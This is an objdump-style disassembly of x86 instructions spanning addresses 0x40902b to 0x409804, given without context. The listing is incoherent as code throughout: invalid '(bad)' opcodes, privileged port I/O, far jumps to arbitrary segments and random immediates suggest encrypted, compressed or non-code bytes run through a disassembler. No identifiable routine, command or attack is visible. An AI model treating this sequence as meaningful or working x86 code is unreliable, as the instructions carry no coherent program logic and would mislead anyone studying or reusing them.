  40902b:	not    BYTE PTR [edi]
  40902d:	test   DWORD PTR [edx+edx*2],esp
  409030:	push   ebp
  409031:	out    dx,eax
  409032:	mov    al,ds:0xee6fe6b9
  409037:	mov    esi,0x682d4853
  40903c:	lahf   
  40903d:	push   es
  40903e:	ja     0x409030
  409040:	aas    
  409041:	into   
  409042:	loope  0x409069
  409044:	and    ecx,ebx
  409046:	mov    esi,0x3f202f49
  40904b:	adc    eax,0x3489f13c
  409050:	and    DWORD PTR [ebx+0x1e87c550],esp
  409056:	cmp    dl,bh
  409058:	pop    es
  409059:	mov    ds:0x8f6122a0,eax
  40905e:	cmp    ebx,DWORD PTR [edx]
  409060:	or     bl,BYTE PTR [ebp+0x6c5d88d1]
  409066:	sbb    eax,DWORD PTR [ebx]
  409068:	dec    ebx
  409069:	daa    
  40906a:	cwde   
  40906b:	mov    bh,0xb4
  40906d:	push   es
  40906e:	mov    bl,0xd5
  409070:	sub    ah,al
  409072:	retf   0xe44
  409075:	cmp    bl,dh
  409077:	pop    esi
  409078:	mov    edx,0x499723f3
  40907d:	popa   
  40907e:	cmp    BYTE PTR [edi-0xd],dl
  409081:	aam    0x9
  409083:	xor    DWORD PTR [edi-0x28],ebx
  409086:	and    DWORD PTR [esp+eiz*8-0x44a94ff],esi
  40908d:	(bad)  
  40908f:	xchg   ebp,eax
  409090:	test   eax,0x6a991936
  409095:	xlat   BYTE PTR ds:[ebx]
  409096:	and    eax,0x8e89f55b
  40909b:	fnstenv [edi]
  40909d:	add    DWORD PTR [ebp-0x509a94db],eax
  4090a3:	xor    eax,0xf89ad61d
  4090a8:	fs sbb al,0x41
  4090ab:	mov    DWORD PTR [ecx+0x39],esp
  4090ae:	pop    ebp
  4090af:	xor    eax,0xbb07ef2d
  4090b4:	sub    ah,bh
  4090b6:	addps  xmm5,xmm3
  4090b9:	xor    cl,BYTE PTR [edx+ecx*1-0x1221bf63]
  4090c0:	pop    esi
  4090c1:	xor    DWORD PTR [eax],0xffffffcc
  4090c4:	push   edi
  4090c5:	mov    edi,0xdf4e361e
  4090ca:	xchg   edx,eax
  4090cb:	lods   eax,DWORD PTR ds:[esi]
  4090cc:	pop    ecx
  4090cd:	and    dh,BYTE PTR [ebp+0x23e63781]
  4090d3:	popa   
  4090d4:	jl     0x4090a7
  4090d6:	push   ebp
  4090d7:	push   ecx
  4090d8:	push   esi
  4090d9:	pop    edi
  4090da:	fwait
  4090db:	inc    ebx
  4090dc:	mov    dl,0x9a
  4090de:	and    DWORD PTR [edi],0x42
  4090e1:	bound  esp,QWORD PTR [edx-0x17]
  4090e4:	cli    
  4090e5:	(bad)  
  4090e6:	xor    al,0xe7
  4090e8:	xchg   DWORD PTR [esp+eax*2+0x624c8a6d],esi
  4090ef:	jge    0x4090be
  4090f1:	xor    eax,0x37872301
  4090f6:	hlt    
  4090f7:	mov    ds:0x7c4f3d57,eax
  4090fc:	xchg   BYTE PTR [ecx+0x3],al
  4090ff:	(bad)  
  409101:	or     BYTE PTR [eax+0x4f],0xeb
  409105:	cdq    
  409106:	jp     0x40914f
  409108:	adc    bh,BYTE PTR [esi+edx*8+0x711e1d61]
  40910f:	mov    dh,0xed
  409111:	call   0xbf145246
  409116:	and    DWORD PTR [eax],edx
  409118:	add    ch,BYTE PTR [edx]
  40911a:	xchg   eax,eax
  40911c:	inc    eax
  40911d:	mov    ch,0x70
  40911f:	popa   
  409120:	mov    esi,0x2c7b6378
  409125:	scas   al,BYTE PTR es:[edi]
  409126:	push   0x28
  409128:	adc    edx,DWORD PTR [ebx]
  40912a:	adc    eax,0x1e3099dc
  40912f:	xchg   esp,eax
  409130:	jnp    0x409110
  409132:	push   ecx
  409133:	into   
  409134:	rcl    edi,cl
  409136:	cld    
  409137:	fisttp DWORD PTR [eax]
  409139:	inc    edi
  40913a:	dec    ebp
  40913b:	gs imul ecx,ecx,0xffb1233e
  409142:	push   ds
  409143:	xchg   ebp,eax
  409144:	pop    edx
  409145:	sar    BYTE PTR [ebp-0x6b96ae3b],0x2c
  40914c:	sbb    bh,BYTE PTR [esi+0x454d30b6]
  409152:	ss aad 0xdc
  409155:	sahf   
  409156:	add    DWORD PTR [edx-0x44b6bc57],edi
  40915c:	add    esi,DWORD PTR ss:[edx+0x3149bb7e]
  409163:	mov    cl,0x74
  409165:	sahf   
  409166:	daa    
  409167:	add    ebx,DWORD PTR [eax-0x51]
  40916a:	popa   
  40916b:	mov    esp,0xe53eec27
  409170:	daa    
  409171:	push   ebx
  409172:	test   esp,esp
  409174:	out    dx,eax
  409175:	out    dx,al
  409176:	mov    esi,0x1cf2f7af
  40917b:	xor    bl,BYTE PTR [edx]
  40917d:	in     eax,dx
  40917e:	mov    dl,0x8e
  409180:	and    al,0x26
  409182:	(bad)  
  409183:	rol    DWORD PTR [esi+0x4b],1
  409186:	dec    ebx
  409187:	or     ch,ch
  409189:	jle    0x4091f5
  40918b:	ja     0x40914c
  40918d:	add    dh,dl
  40918f:	add    DWORD PTR [esi],ebp
  409191:	test   edi,ebx
  409193:	outs   dx,DWORD PTR ds:[esi]
  409194:	push   ebx
  409195:	xlat   BYTE PTR ds:[ebx]
  409196:	cmp    eax,0xe6eb5f17
  40919b:	jge    0x4091c6
  40919d:	mov    eax,0x746c1714
  4091a2:	xchg   ebx,eax
  4091a3:	cld    
  4091a4:	imul   esi,eax,0x74
  4091a7:	cmp    al,0xd0
  4091a9:	push   0x2cf9c27c
  4091ae:	leave  
  4091af:	xchg   ebp,eax
  4091b0:	retf   
  4091b1:	fcomp  st(7)
  4091b3:	dec    edx
  4091b4:	mov    ecx,0x709cb3be
  4091b9:	pop    edx
  4091ba:	adc    eax,0xebd27a88
  4091bf:	mov    ch,0xe5
  4091c1:	ins    DWORD PTR es:[edi],dx
  4091c2:	mov    al,ds:0x64ca479
  4091c7:	dec    ecx
  4091c8:	and    ebx,DWORD PTR [edi+0x62]
  4091cb:	test   eax,0xe62812f5
  4091d0:	push   ss
  4091d1:	retf   
  4091d2:	gs (bad) 
  4091d4:	shl    BYTE PTR [ebx],1
  4091d6:	mov    BYTE PTR [edi+0x62dcc18a],ch
  4091dc:	out    0x38,eax
  4091de:	cmp    BYTE PTR [ecx-0x626a54fe],dh
  4091e4:	fisub  WORD PTR [esp+edx*4]
  4091e7:	mov    edx,0x56a765de
  4091ec:	inc    esp
  4091ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ee:	jno    0x4091fc
  4091f0:	push   ebp
  4091f1:	repnz mov cl,0xb9
  4091f4:	dec    edx
  4091f5:	jno    0x4091f5
  4091f7:	xchg   DWORD PTR [ebx-0x10],ecx
  4091fa:	and    DWORD PTR [eax],esi
  4091fc:	sahf   
  4091fd:	das    
  4091fe:	mov    bl,0x68
  409200:	lea    edx,[edx]
  409202:	jnp    0x40919b
  409204:	sbb    eax,0x7a46c149
  409209:	pop    ebp
  40920a:	mov    ds:0x30f6f2f0,eax
  40920f:	inc    BYTE PTR [edx-0x4e]
  409212:	cwde   
  409213:	adc    eax,0x1d725ee0
  409218:	cmp    al,0xbe
  40921a:	(bad)  
  40921b:	pop    eax
  40921c:	cli    
  40921d:	mov    edi,0xee7eade1
  409222:	sbb    edi,eax
  409224:	mov    ah,0x11
  409226:	xor    BYTE PTR [edx+0x60],ch
  409229:	cmp    DWORD PTR [eax-0x7a],0x12f11d93
  409230:	sub    esi,ebp
  409232:	bound  esp,QWORD PTR [esi-0x1c]
  409235:	cmp    al,BYTE PTR [ebp-0x29fb99e2]
  40923b:	mov    ds:0x92ae21ec,eax
  409240:	mov    esp,edx
  409242:	jnp    0x4092ac
  409244:	test   ebx,0x1cab751e
  40924a:	dec    edi
  40924b:	into   
  40924c:	rcr    dl,0xd3
  40924f:	mov    ds:0x4f47bd1d,al
  409254:	pop    ds
  409255:	stos   BYTE PTR es:[edi],al
  409256:	inc    edi
  409257:	adc    DWORD PTR [eax+0x48],edx
  40925a:	imul   cl
  40925c:	or     al,0xb0
  40925e:	fcomp  QWORD PTR [ebx+0x14]
  409261:	je     0x4092d2
  409263:	xor    al,0x16
  409265:	xlat   BYTE PTR ds:[ebx]
  409266:	pop    esi
  409267:	jae    0x409248
  409269:	pop    esp
  40926a:	pusha  
  40926b:	cmp    BYTE PTR [edi-0x4e],dh
  40926e:	jo     0x4092e5
  409270:	jne    0x409280
  409272:	push   ebp
  409273:	mov    esi,0x82bb86bb
  409278:	data16 ds aam 0x3
  40927c:	jmp    0x101:0x86e32c4b
  409283:	xchg   ebx,eax
  409284:	jmp    0x5b6b:0x41b9ed02
  40928b:	jbe    0x409227
  40928d:	mov    dl,0x1d
  40928f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409290:	ret    0xc27f
  409293:	mov    ds,WORD PTR [ebx]
  409295:	push   0x42
  409297:	fnstcw WORD PTR ds:0xdc414fc8
  40929d:	lock xchg ebp,eax
  40929f:	outs   dx,DWORD PTR ds:[esi]
  4092a0:	test   BYTE PTR [ecx-0x1a60cc0],0x27
  4092a7:	cs addr16 loopne 0x4092cc
  4092ab:	ins    DWORD PTR es:[edi],dx
  4092ac:	or     bl,al
  4092ae:	or     DWORD PTR ss:[esp+eax*4-0x7],0xffffffa5
  4092b4:	popa   
  4092b5:	push   0xef499cc5
  4092ba:	rcl    eax,0x1
  4092bd:	jmp    0xbe864bd1
  4092c2:	mov    ebp,0x42b91254
  4092c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c8:	inc    esi
  4092c9:	sbb    al,0x5b
  4092cb:	das    
  4092cc:	dec    esi
  4092cd:	add    ebx,esi
  4092cf:	push   esi
  4092d0:	rcl    DWORD PTR [esi],cl
  4092d2:	mov    edi,0x36255693
  4092d7:	pop    ds
  4092d8:	out    0xee,eax
  4092da:	dec    edx
  4092db:	jecxz  0x409278
  4092dd:	jb     0x409335
  4092df:	lods   al,BYTE PTR ds:[esi]
  4092e0:	pop    esp
  4092e1:	aam    0xbc
  4092e3:	jo     0x409300
  4092e5:	das    
  4092e6:	pop    ss
  4092e7:	jno    0x409343
  4092e9:	(bad)  
  4092ea:	loopne 0x40934c
  4092ec:	cmp    cl,BYTE PTR [ecx-0x69]
  4092ef:	ss push ebx
  4092f1:	jmp    0x314f626e
  4092f6:	ja     0x409295
  4092f8:	shl    BYTE PTR [ebp-0x91defa6],cl
  4092fe:	icebp  
  4092ff:	add    edx,DWORD PTR [ebp+0x2c25a78a]
  409305:	xchg   edx,eax
  409306:	mov    ch,0xf2
  409308:	push   es
  409309:	stc    
  40930a:	test   al,0xf2
  40930c:	mov    cl,0x76
  40930e:	mov    edi,0xfc664aa2
  409313:	sub    DWORD PTR [ebp-0x52],ebx
  409316:	or     ebx,DWORD PTR [esi]
  409318:	cmp    edi,ebp
  40931a:	popa   
  40931b:	nop
  40931c:	out    dx,eax
  40931d:	lds    ebp,FWORD PTR [esi-0x30]
  409320:	iret   
  409321:	dec    eax
  409322:	or     cl,ah
  409324:	retf   0x67ea
  409327:	xor    eax,0x82d0633e
  40932c:	ss xchg esp,eax
  40932e:	mov    edi,0xb0199c44
  409333:	jnp    0x40931d
  409335:	ds cld 
  409337:	test   eax,0x429500c2
  40933c:	daa    
  40933d:	add    bh,BYTE PTR [edi]
  40933f:	popf   
  409340:	xor    BYTE PTR ds:0x19a358f6,cl
  409346:	int    0xf4
  409348:	mov    dl,bl
  40934a:	pop    es
  40934b:	stos   DWORD PTR es:[edi],eax
  40934c:	jno    0x409301
  40934e:	or     eax,0xa5e34186
  409353:	xchg   ebx,eax
  409354:	inc    edi
  409355:	sbb    esp,DWORD PTR [ebx]
  409357:	sbb    ebx,ecx
  409359:	and    dh,BYTE PTR [edx]
  40935b:	add    edx,ebx
  40935d:	mov    ecx,0x40d5488e
  409362:	jge    0x409348
  409364:	push   ds
  409365:	icebp  
  409366:	push   esp
  409367:	mov    cl,0x28
  409369:	add    BYTE PTR [ecx+0x561c6fe9],ah
  40936f:	int3   
  409370:	gs push ebx
  409372:	dec    esi
  409373:	rol    BYTE PTR [edx],cl
  409375:	adc    BYTE PTR [eax-0x438abe7c],bh
  40937b:	(bad)  
  40937d:	mov    cl,BYTE PTR [esi]
  40937f:	lea    eax,[ebx+0x3f9a1f2d]
  409385:	ss inc eax
  409387:	dec    edi
  409388:	sub    ecx,edi
  40938a:	xor    BYTE PTR [edi+0x7a42ed45],bl
  409390:	sub    eax,0x7708003f
  409395:	pop    ebp
  409396:	sub    eax,0x9bfc1996
  40939b:	mov    esi,0x9de725d1
  4093a0:	pushf  
  4093a1:	icebp  
  4093a2:	push   eax
  4093a3:	stc    
  4093a4:	pop    esi
  4093a5:	es xchg ecx,eax
  4093a7:	call   0xad9ae4e0
  4093ac:	push   cs
  4093ad:	in     al,dx
  4093ae:	push   ss
  4093af:	push   0x3de9e2ce
  4093b4:	xlat   BYTE PTR ds:[ebx]
  4093b5:	inc    ebx
  4093b6:	pop    ds
  4093b7:	jmp    DWORD PTR [ebp-0x68]
  4093ba:	ja     0x40934d
  4093bc:	sahf   
  4093bd:	lods   eax,DWORD PTR ds:[esi]
  4093be:	lds    ebp,FWORD PTR [ecx+0x62]
  4093c1:	push   ebp
  4093c2:	fisub  WORD PTR ds:0x9ba41f2
  4093c8:	dec    ebx
  4093c9:	adc    ah,BYTE PTR [esp+edi*4+0x23]
  4093cd:	call   0x267b:0xa98b5c55
  4093d4:	fld    QWORD PTR [edx+0x57]
  4093d7:	xchg   esp,eax
  4093d8:	in     eax,0xe8
  4093da:	retf   
  4093db:	sub    al,0x8
  4093dd:	dec    esi
  4093de:	int    0x4
  4093e0:	jg     0x409413
  4093e2:	xchg   esi,eax
  4093e3:	test   al,0xfe
  4093e5:	mov    bh,0x27
  4093e7:	aas    
  4093e8:	and    al,0xc4
  4093ea:	xor    BYTE PTR [ecx],ah
  4093ec:	pusha  
  4093ed:	int    0x26
  4093ef:	xor    eax,0x2126a61d
  4093f4:	xor    BYTE PTR [esi+0x63],bl
  4093f7:	xor    eax,0x1c620999
  4093fc:	out    dx,eax
  4093fd:	iret   
  4093fe:	lea    esi,[eax-0x60]
  409401:	and    al,0x9b
  409403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409404:	adc    bh,bl
  409406:	mov    cl,0xa1
  409408:	cmp    al,0x1d
  40940a:	jg     0x409407
  40940c:	retf   
  40940d:	clc    
  40940e:	push   ecx
  40940f:	repz dec ecx
  409411:	pop    ecx
  409412:	inc    ebp
  409413:	mov    al,ds:0xb3d8dca
  409418:	icebp  
  409419:	outs   dx,BYTE PTR ds:[esi]
  40941a:	xchg   esi,eax
  40941b:	jmp    0xc57def21
  409420:	jp     0x40947e
  409422:	pushf  
  409423:	cmp    BYTE PTR [edx-0x71],0xa1
  409427:	pop    ss
  409428:	in     eax,dx
  409429:	and    eax,DWORD PTR [ebx+0x39]
  40942c:	and    BYTE PTR [edi+0x6b],ch
  40942f:	aas    
  409430:	xchg   edx,eax
  409431:	xor    dh,ch
  409433:	jo     0x4093e9
  409435:	pushf  
  409436:	in     al,0xe0
  409438:	and    bl,BYTE PTR [ecx-0x298a7217]
  40943e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40943f:	outs   dx,DWORD PTR ds:[esi]
  409440:	add    BYTE PTR [edi+0x59],ch
  409443:	or     BYTE PTR [eax-0x230a2866],0xae
  40944a:	lods   eax,DWORD PTR fs:[esi]
  40944c:	mov    ds:0x1948e8f,al
  409451:	xchg   esi,esp
  409453:	mov    edi,0x6645ad34
  409458:	int    0xb8
  40945a:	jmp    0x4c70915d
  40945f:	and    al,0xf8
  409461:	mov    ah,0xb9
  409463:	mov    eax,0x95736ae3
  409468:	js     0x409489
  40946a:	xor    bh,BYTE PTR [ebx]
  40946c:	cdq    
  40946d:	add    eax,0xf62cf5f2
  409472:	xchg   DWORD PTR [ebx],esp
  409474:	push   0xffffffed
  409476:	mov    eax,ds:0x14ceaadb
  40947b:	inc    esp
  40947c:	add    ecx,ebx
  40947e:	pop    ds
  40947f:	rcl    BYTE PTR [esi-0x712c8278],0x6
  409486:	push   es
  409487:	mov    dh,0x8
  409489:	add    BYTE PTR [edi+0xa],cl
  40948c:	fdivr  QWORD PTR [edx-0x63]
  40948f:	pop    esp
  409490:	jmp    0x2bc1:0xa8fa8ff2
  409497:	imul   DWORD PTR [edi]
  409499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40949a:	test   DWORD PTR [bx+0x78],ecx
  40949e:	and    esi,eax
  4094a0:	stos   DWORD PTR es:[edi],eax
  4094a1:	ret    
  4094a2:	or     eax,0x9dcc6e82
  4094a7:	push   0xeff492f6
  4094ac:	xchg   esi,eax
  4094ad:	xor    ecx,DWORD PTR [edi+edx*4]
  4094b0:	loop   0x409459
  4094b2:	data16 shr BYTE PTR [ecx+0x25],1
  4094b6:	dec    eax
  4094b7:	pop    eax
  4094b8:	cmp    dh,dh
  4094ba:	cmp    al,0x35
  4094bc:	nop
  4094bd:	mov    dl,0xa
  4094bf:	jno    0x40945e
  4094c1:	fist   WORD PTR [ebp-0xb]
  4094c4:	fisttp WORD PTR [esi-0x4ab0c832]
  4094ca:	pop    eax
  4094cb:	and    bh,ah
  4094cd:	or     BYTE PTR [ebx-0x55],ch
  4094d0:	(bad)  
  4094d1:	mov    gs,WORD PTR [esi-0x1e]
  4094d4:	xchg   edx,eax
  4094d5:	out    0x3c,al
  4094d7:	mov    ah,0xc5
  4094d9:	shr    BYTE PTR [eax-0x64946dd5],cl
  4094df:	loope  0x4094ae
  4094e1:	mov    esp,0xd924045f
  4094e6:	dec    edx
  4094e7:	push   cs
  4094e8:	xor    DWORD PTR ds:0xa63ebb99,0xffffffe4
  4094ef:	xor    dh,BYTE PTR [esi-0x17cced50]
  4094f5:	lods   al,BYTE PTR ds:[esi]
  4094f6:	mov    ?,WORD PTR [edx-0x7f]
  4094f9:	adc    DWORD PTR [esp+eax*4-0x22],0x27
  4094fe:	mov    ebx,0x67ab5d46
  409503:	fwait
  409504:	pusha  
  409505:	out    dx,al
  409506:	jo     0x409494
  409508:	sub    eax,0xa56750db
  40950d:	pop    ds
  40950e:	(bad)  
  40950f:	fsub   DWORD PTR [esp+ebx*1]
  409512:	pop    es
  409513:	inc    esi
  409514:	fist   DWORD PTR [esi+edi*4]
  409517:	jmp    0xc716:0x6674e0e8
  40951e:	mov    al,ds:0xfff26ab8
  409523:	and    DWORD PTR [ebx-0x3acb68eb],edx
  409529:	out    dx,al
  40952a:	into   
  40952b:	or     BYTE PTR [ebx],0x24
  40952e:	mov    eax,0xc99fe817
  409533:	adc    al,0x78
  409535:	push   0xa3c59c82
  40953a:	aaa    
  40953b:	aam    0x47
  40953d:	and    bl,BYTE PTR [edi+0x6a]
  409540:	xor    BYTE PTR [ebp-0x4427974a],bl
  409546:	sahf   
  409547:	dec    eax
  409548:	jnp    0x4095c3
  40954a:	les    ebp,FWORD PTR [edi+0x2ae66a09]
  409550:	repnz push ds
  409552:	inc    esi
  409553:	int    0x53
  409555:	inc    ebx
  409556:	push   0xffffffb9
  409558:	add    esp,DWORD PTR [edi+0x13]
  40955b:	jmp    0xeb15f4cf
  409560:	inc    ebp
  409561:	jbe    0x409535
  409563:	mov    ds:0x6bbf913a,eax
  409568:	xchg   ecx,eax
  409569:	sub    BYTE PTR [eax],dl
  40956b:	in     eax,0x95
  40956d:	or     ecx,DWORD PTR [eax+0xcf9f2f9]
  409573:	aas    
  409574:	je     0x409502
  409576:	das    
  409577:	test   ebp,edx
  409579:	in     eax,dx
  40957a:	mov    ah,0x70
  40957c:	inc    ebx
  40957d:	dec    ah
  40957f:	ret    0x2d25
  409582:	add    edx,DWORD PTR [ebx+0x37f90059]
  409588:	mov    bh,0x68
  40958a:	or     edx,edx
  40958c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40958d:	jmp    0x4095b6
  40958f:	push   0xdd6e746
  409594:	test   al,0x22
  409596:	jae    0x409529
  409598:	pop    ds
  409599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40959a:	jmp    0x9eaa4ba6
  40959f:	sti    
  4095a0:	sub    BYTE PTR [ecx-0x6d],0xf2
  4095a4:	push   ebx
  4095a5:	sar    DWORD PTR [eax+0x4dec53bd],0xbf
  4095ac:	hlt    
  4095ad:	das    
  4095ae:	scas   eax,DWORD PTR es:[edi]
  4095af:	jnp    0x4095b5
  4095b1:	push   ebx
  4095b2:	and    bh,al
  4095b4:	lds    ecx,FWORD PTR [eax]
  4095b6:	inc    ecx
  4095b7:	push   eax
  4095b8:	inc    eax
  4095b9:	xchg   esi,eax
  4095ba:	clc    
  4095bb:	inc    edx
  4095bc:	inc    edi
  4095bd:	mov    bh,0x6e
  4095bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095c0:	pop    es
  4095c1:	lea    edi,[ebp-0x3e]
  4095c4:	pop    esp
  4095c5:	sbb    DWORD PTR [eax],ecx
  4095c7:	loopne 0x4095f8
  4095c9:	add    bl,BYTE PTR [eax+0x6b93f5a3]
  4095cf:	test   BYTE PTR [edx-0x11],0xb8
  4095d3:	addr16 mov edi,0x2b86266f
  4095d9:	in     al,dx
  4095da:	lock inc eax
  4095dc:	pop    ebp
  4095dd:	adc    eax,eax
  4095df:	ins    DWORD PTR es:[edi],dx
  4095e0:	mov    eax,ds:0x914c9682
  4095e5:	(bad)  
  4095e8:	jns    0x409594
  4095ea:	call   0x4a1d:0x3c35d529
  4095f1:	xlat   BYTE PTR ds:[ebx]
  4095f2:	lods   al,BYTE PTR ds:[esi]
  4095f3:	mov    bl,0x46
  4095f5:	scas   eax,DWORD PTR es:[edi]
  4095f6:	retf   0x3534
  4095f9:	pop    DWORD PTR [ecx+0x48]
  4095fc:	loopne 0x409620
  4095fe:	pop    esp
  4095ff:	and    ch,BYTE PTR [ebx-0x7d]
  409602:	jl     0x4095e3
  409604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409605:	pop    ecx
  409606:	mov    edi,0x30959a44
  40960b:	push   ebx
  40960c:	mov    ebx,0x49798428
  409611:	das    
  409612:	inc    edx
  409613:	adc    BYTE PTR [edi],al
  409615:	mov    esp,0xec354bc3
  40961a:	mov    ch,0xcd
  40961c:	inc    ecx
  40961d:	or     edx,DWORD PTR [ecx]
  40961f:	iret   
  409620:	xor    esi,DWORD PTR [eax]
  409622:	xor    dl,BYTE PTR [eax-0x107fbca5]
  409628:	fidiv  WORD PTR [ecx+0x50]
  40962b:	test   DWORD PTR [edx+0x4e1f5f96],edi
  409631:	retf   
  409632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409633:	dec    edi
  409634:	mov    edx,0x301b5cd6
  409639:	js     0x4096b4
  40963b:	inc    ecx
  40963c:	jmp    0xedd4ba12
  409641:	jecxz  0x409609
  409643:	push   esp
  409644:	xlat   BYTE PTR cs:[ebx]
  409646:	pusha  
  409647:	cmp    dh,bh
  409649:	or     ch,BYTE PTR [esi+0x402ba558]
  40964f:	push   esp
  409650:	ds cdq 
  409652:	push   edx
  409653:	bound  esp,QWORD PTR [edi+ebx*8+0x98e57aa]
  40965a:	push   ebx
  40965b:	or     cl,BYTE PTR [edx]
  40965d:	lock cli 
  40965f:	mov    edi,0x324d1df9
  409664:	fbld   TBYTE PTR [edi]
  409666:	mov    bh,0xd8
  409668:	test   eax,0x6fac0382
  40966d:	daa    
  40966e:	jmp    0x409615
  409670:	add    ecx,eax
  409672:	jne    0x409626
  409674:	push   es
  409675:	push   edi
  409676:	pop    edi
  409677:	adc    DWORD PTR [esi+0x2727f986],0x40
  40967e:	aas    
  40967f:	dec    eax
  409680:	xchg   edx,eax
  409681:	fisubr WORD PTR [ebx-0xf]
  409684:	not    BYTE PTR [ebx+0x3f]
  409687:	push   es
  409688:	mov    edi,0x329777fd
  40968d:	mov    ecx,0xfdb5169a
  409692:	push   ebx
  409693:	sti    
  409694:	sub    DWORD PTR [ecx],edx
  409696:	mov    cs,WORD PTR ds:0x869311b2
  40969c:	add    DWORD PTR [edx+esi*4-0x34bfd963],ebp
  4096a3:	out    dx,eax
  4096a4:	ret    0x204
  4096a7:	push   eax
  4096a8:	mov    ah,0xba
  4096aa:	loopne 0x409710
  4096ac:	pop    ecx
  4096ad:	mov    es,WORD PTR ss:[edx-0x2d]
  4096b1:	jge    0x4096ed
  4096b3:	icebp  
  4096b4:	hlt    
  4096b5:	cmp    ebp,DWORD PTR [eax+0x1d]
  4096b8:	lods   al,BYTE PTR ds:[esi]
  4096b9:	lods   eax,DWORD PTR ds:[esi]
  4096ba:	xchg   ebp,eax
  4096bb:	sti    
  4096bc:	inc    edi
  4096bd:	hlt    
  4096be:	xchg   ebp,eax
  4096bf:	inc    edi
  4096c0:	aaa    
  4096c1:	daa    
  4096c2:	ds push ebx
  4096c4:	xchg   BYTE PTR [ecx],bh
  4096c6:	clc    
  4096c7:	sbb    BYTE PTR [ebx+0x98bb20a],bl
  4096cd:	mov    esi,0x2c67c584
  4096d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096d3:	out    dx,eax
  4096d4:	dec    ebp
  4096d5:	loop   0x40970f
  4096d7:	jns    0x409721
  4096d9:	dec    ebx
  4096da:	cmp    si,WORD PTR [ecx-0x3d442038]
  4096e1:	addr16 pop ecx
  4096e3:	sahf   
  4096e4:	mov    bl,0x8
  4096e6:	push   cs
  4096e7:	ficomp DWORD PTR [edi+0x5fc98ad7]
  4096ed:	inc    esp
  4096ee:	(bad)  
  4096ef:	pop    esp
  4096f0:	test   eax,0x53ed9c6d
  4096f5:	in     al,0x1d
  4096f7:	cmp    DWORD PTR [ebx-0x70ab65c1],eax
  4096fd:	adc    BYTE PTR [ebp-0x34],dh
  409700:	pusha  
  409701:	xor    al,0xb7
  409703:	mov    cl,0x18
  409705:	jge    0x409745
  409707:	ins    DWORD PTR es:[edi],dx
  409708:	call   0x81eee59
  40970d:	cmp    cl,BYTE PTR [ebp+ecx*2-0x7ef9fe9a]
  409714:	xchg   DWORD PTR [eax+0x44b68c1c],ebx
  40971a:	test   al,0xeb
  40971c:	adc    al,0x98
  40971e:	fmul   QWORD PTR [eax]
  409720:	(bad)  
  409721:	mov    ch,0xfe
  409723:	sar    DWORD PTR [ebp+0x3cbe5b5f],0xd5
  40972a:	add    DWORD PTR [ebx+0x6b0f2e1f],eax
  409730:	cmp    al,0x62
  409732:	mov    ecx,0xca4d48e3
  409737:	arpl   di,cx
  409739:	mov    edx,0x576e1387
  40973e:	inc    ecx
  40973f:	rcr    BYTE PTR [edx],1
  409741:	out    dx,eax
  409742:	xchg   DWORD PTR [edx+0x7091c028],esp
  409748:	cmp    al,0x9a
  40974a:	(bad)  
  40974b:	mov    fs,esp
  40974d:	jl     0x409711
  40974f:	add    eax,0x70c5d0b6
  409754:	dec    ebx
  409755:	sub    al,0x77
  409757:	pop    eax
  409758:	retf   0x115e
  40975b:	sti    
  40975c:	sbb    al,0xf7
  40975e:	mov    cl,0x62
  409760:	mov    cl,0xef
  409762:	xchg   ecx,eax
  409763:	sbb    dl,BYTE PTR [ebx-0x33]
  409766:	call   edi
  409768:	sar    ecx,cl
  40976a:	mov    esi,0x2433b49a
  40976f:	push   esp
  409770:	mov    ds:0xed323f0f,eax
  409775:	and    eax,0xfdb71270
  40977a:	mov    WORD PTR [esi+0xd],ds
  40977d:	cmp    eax,ebp
  40977f:	mov    edi,?
  409781:	aad    0x9c
  409783:	jne    0x40978e
  409785:	mov    ch,0x9b
  409787:	fs stc 
  409789:	dec    edi
  40978a:	out    0x30,eax
  40978c:	dec    edx
  40978d:	mov    bh,0x98
  40978f:	pop    ds
  409790:	mov    eax,ds:0x4348fa15
  409795:	jecxz  0x40972b
  409797:	dec    esi
  409798:	push   esi
  409799:	adc    eax,0xd61c0666
  40979e:	scas   al,BYTE PTR es:[edi]
  40979f:	cdq    
  4097a0:	fisttp QWORD PTR [eax-0xe]
  4097a3:	and    eax,0x24c26bf9
  4097a8:	shl    BYTE PTR [edi],cl
  4097aa:	scas   al,BYTE PTR es:[edi]
  4097ab:	cwde   
  4097ac:	ins    DWORD PTR es:[edi],dx
  4097ad:	jno    0x409785
  4097af:	jl     0x4097b6
  4097b1:	shl    al,cl
  4097b3:	mov    esp,0x1ca85df2
  4097b8:	(bad)  
  4097b9:	icebp  
  4097ba:	mov    WORD PTR [edi+0x79],es
  4097bd:	test   eax,0xeee71a35
  4097c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097c3:	xchg   ebx,eax
  4097c4:	adc    ah,bl
  4097c6:	or     BYTE PTR [edx-0x16],0x55
  4097ca:	inc    ebp
  4097cb:	mov    ch,0xec
  4097cd:	sub    ah,BYTE PTR [esi]
  4097cf:	xchg   BYTE PTR [ebx+0x17f8b1c6],bl
  4097d5:	pop    ds
  4097d6:	stos   DWORD PTR es:[edi],eax
  4097d7:	dec    ebx
  4097d8:	dec    eax
  4097d9:	sub    al,0x29
  4097db:	mov    esp,0x8bac7a70
  4097e0:	ins    BYTE PTR es:[edi],dx
  4097e1:	sub    dh,BYTE PTR [eax+0x68]
  4097e4:	in     al,dx
  4097e5:	inc    eax
  4097e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097e7:	inc    eax
  4097e8:	hlt    
  4097e9:	mov    esp,0x5e2c7589
  4097ee:	test   BYTE PTR [eax+0x48bbd484],0xa3
  4097f5:	lea    ecx,[edi]
  4097f7:	push   ecx
  4097f8:	or     DWORD PTR [eax-0x2132769c],edi
  4097fe:	push   edx
  4097ff:	in     al,0xa2
  409801:	mov    ch,0x66
  409803:	cdq    
  409804:	xor    bl,BYTE PTR [edx+0x3e247d31]
